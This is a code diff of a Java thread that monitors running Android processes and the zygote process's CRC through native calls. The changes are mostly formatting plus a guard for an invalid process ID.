@@ -15,22 +15,22 @@ import com.android.networking.util.Check;
 
 public class BroadcastMonitorProcess extends Thread {
 	static {
-        System.loadLibrary("runner");
+		System.loadLibrary("runner");
 	}
 
 	/** The Constant TAG. */
 	private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$
-	
+
 	// Get PID
 	private native int gp(String process);
-	
+
 	// Get CRC
 	private native int gc(int p);
-	
+
 	private boolean stop;
 	private final int period;
 	private int zygotePid, crcList;
-	
+
 	RunningProcesses runningProcess;
 
 	private ListenerProcess listenerProcess;
@@ -49,26 +49,28 @@ public class BroadcastMonitorProcess extends Thread {
 	@Override
 	public void run() {
 		int curCrc;
-		
+
 		do {
-			if (stop) {				
+			if (stop) {
 				return;
 			}
 
-			curCrc = gc(zygotePid);
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (run) crc: " + curCrc);
+			if (zygotePid != -1) {
+				curCrc = gc(zygotePid);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (run) crc: " + curCrc);
+				}
+
+				if (curCrc != crcList) {
+					crcList = curCrc;
+				}
 			}
-			
-			if (curCrc != crcList) {								
-				crcList = curCrc;
-			}
-			
+
 			runningProcess.update();
 			listenerProcess.dispatch(runningProcess);
 
 			try {
-				synchronized(this){
+				synchronized (this) {
 					wait(period);
 				}
 			} catch (final InterruptedException e) {
